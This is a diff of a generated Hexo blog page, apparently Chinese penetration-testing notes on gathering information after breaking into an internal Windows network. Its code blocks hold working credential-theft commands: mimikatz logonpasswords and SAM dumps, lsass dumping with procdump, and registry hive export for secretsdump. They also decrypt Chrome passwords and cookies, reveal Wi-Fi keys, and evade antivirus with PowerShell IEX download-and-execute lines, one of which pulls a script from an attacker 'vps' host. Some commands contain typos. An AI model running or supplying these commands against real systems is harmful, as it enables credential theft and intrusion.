@@ -52,7 +52,9 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -170,7 +172,6 @@
 <p>从内存当中抓取当前登录用户的密码及其哈希值</p>
 <p>常用本地非交互式凭证获取。实际场景由于是上传一个mimikatz，很多shell并不支持交互式使用，因此常用非交互式获取凭证</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line"> </span><br><span class="line">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li><code>log res.txt</code> 将日志记录到res.txt中</li>
 <li><code>privilege::debug</code>  通过debug模式提权</li>
@@ -181,20 +182,20 @@
 </ul>
 <p>对于低版本<code>1.x</code>的mimikatz，使用方式如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug // 提权</span><br><span class="line">inject::process lsass.exe sekurlsa.dll   // 注入sekurlsa.dll 到 lsass.exe进程 lsass.exe在系统启动后会记录密码信息</span><br><span class="line">@getLogonPasswords获取密码</span><br></pre></td></tr></table></figure>
-
 <p><strong>免杀操作</strong></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/234365.html">https://www.freebuf.com/articles/system/234365.html</a></p>
 <p>绕过查杀的方式之一：<strong>Powershell远程加载mimikatz脚本</strong></p>
 <p>可以针对关键字进行混淆</p>
 <p><img src="/2023/01/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/image-20230103234333919.png" alt="image-20230103234333919"></p>
 <p>IEX会将对象加载进内存中并执行后面的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX (New-Object-Net WebClient).DownloadString(&quot;url&quot;); Invoke-Mimikatz-DumpCreds</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX (New-Object-Net WebClient).DownloadString(&quot;url&quot;); Invoke-Mimikatz-DumpCreds</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>wce</strong></p>
 <p>适用于win7低版本操作系统</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-w 获取明文密码</span><br><span class="line">-l 获取当前在线用户NTLM哈希值</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-w 获取明文密码</span><br><span class="line">-l 获取当前在线用户NTLM哈希值</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>Pwddump7</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwddump7.exe &gt; res.txt</span><br></pre></td></tr></table></figure>
-
 <p>获取当前系统各个密码的哈希值</p>
 <p>解密利用彩虹表 <a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
 </li>
@@ -202,41 +203,47 @@
 <p>配合彩虹表自己破解</p>
 <p>工具下载：<a target="_blank" rel="noopener" href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a></p>
 <p>彩虹表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ophcrack.sourceforge.io/tables.php</span><br><span class="line">http://project-rainbowcrack.com/table.htm</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ophcrack.sourceforge.io/tables.php</span><br><span class="line">http://project-rainbowcrack.com/table.htm</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>Procdump+Mimikatz</strong></p>
 <p>Procdump的作用主要是免杀，现在可以用的是<code>SharpDump</code>(C#写的不太会编译…)</p>
 <p>会将当前系统进程当中的哈希保存到bin文件，改成zip文件并解压</p>
 <p>主要流程就是 将lsass进程导出，形成转储文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">32位操作系统: processdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">64位操作系统: processdump.exe -ma lsass.exe lsass,dmp</span><br></pre></td></tr></table></figure>
-
 <p>然后再使用之前Mimikatz的模块提取明文密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekursa::mimidump lsass.dmp</span><br><span class="line">sekursa::logonPasswords full</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekursa::mimidump lsass.dmp</span><br><span class="line">sekursa::logonPasswords full</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>注册表导出</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security security.hiv</span><br></pre></td></tr></table></figure>
-
 <p>获取注册表中的SAM信息、用户登录密码哈希信息并导出为文件</p>
 <p>再利用下面的方式进行明文获取</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /system.hiv /sam:sam.hiv&quot;  exit</span><br><span class="line"> </span><br><span class="line">python secretsdump.py -sam -sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
-
 <p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a> 多种恢复本地信息密码的工具</p>
 </li>
 </ol>
 <h4 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h4><ol>
 <li><p><strong>IE浏览器代理信息查看</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Setting&quot;</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Setting&quot;</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>Windows Wifi密码获取</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profile name=&quot;wifiName&quot; key=clear</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan show profile name=&quot;wifiName&quot; key=clear</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>Windows hosts config</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>Windows IIS config</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IIS6: </span><br><span class="line">cscript.exe C:\Inetpub\AdminScripts\adsuitil</span><br><span class="line">.vbs ENUM W3SVC/1/root</span><br><span class="line"> </span><br><span class="line">IIS7/8:</span><br><span class="line">列出网站列表: %systemroot%/system32/inetsrv/appcmd.exe list site</span><br><span class="line">列出网站物理路径: %systemroot%\system32\inetsrv\appcmd.cxe list vdir</span><br><span class="line"> </span><br><span class="line">Mimikatz读取IIS7配置文件密码:</span><br><span class="line">mimikatz.exe privilege::debug log &quot;iis::apphost/in&quot;%systemroot%\system32\inetsrv\config\applicationHost config&quot; /live&quot; exit</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IIS6: </span><br><span class="line">cscript.exe C:\Inetpub\AdminScripts\adsuitil</span><br><span class="line">.vbs ENUM W3SVC/1/root</span><br><span class="line"> </span><br><span class="line">IIS7/8:</span><br><span class="line">列出网站列表: %systemroot%/system32/inetsrv/appcmd.exe list site</span><br><span class="line">列出网站物理路径: %systemroot%\system32\inetsrv\appcmd.cxe list vdir</span><br><span class="line"> </span><br><span class="line">Mimikatz读取IIS7配置文件密码:</span><br><span class="line">mimikatz.exe privilege::debug log &quot;iis::apphost/in&quot;%systemroot%\system32\inetsrv\config\applicationHost config&quot; /live&quot; exit</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>Windows回收站信息获取</strong></p>
 <p>回收站路径为<code>C:\$Recycle.Bin</code>，不同用户对应不同的回收站，需要遍历一下用户id值来找各自删除的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /f &quot;skip=1 tokens=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;)do dir /a/b</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /f &quot;skip=1 tokens=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;)do dir /a/b</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>Chrome的密码和cookie获取</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%localappdata%\google\chrom\USERDA~1\dedault\LOGIND~1</span><br><span class="line">%localappdata%\google\chrom\USERDA~1\dedault\cookies</span><br><span class="line"></span><br><span class="line">chrom用户信息保存在本地为sqlite数据库格式</span><br><span class="line"></span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\google\chrom\USERDA~1\default\cookies /unprotect&quot; exit</span><br><span class="line"> </span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\google\chrom\USERDA~1\default\LOGIND~1&quot; exit</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%localappdata%\google\chrom\USERDA~1\dedault\LOGIND~1</span><br><span class="line">%localappdata%\google\chrom\USERDA~1\dedault\cookies</span><br><span class="line"></span><br><span class="line">chrom用户信息保存在本地为sqlite数据库格式</span><br><span class="line"></span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\google\chrom\USERDA~1\default\cookies /unprotect&quot; exit</span><br><span class="line"> </span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrom/in:%localappdata%\google\chrom\USERDA~1\default\LOGIND~1&quot; exit</span><br></pre></td></tr></table></figure>
+</li>
 <li><p><strong>Powershell</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX(new-object net.webclient).downloadstring(&#x27;http://vps:port/GEt-Information.ps1&#x27;);Get-Information</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe IEX(new-object net.webclient).downloadstring(&#x27;http://vps:port/GEt-Information.ps1&#x27;);Get-Information</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
 </li>
 </ul>
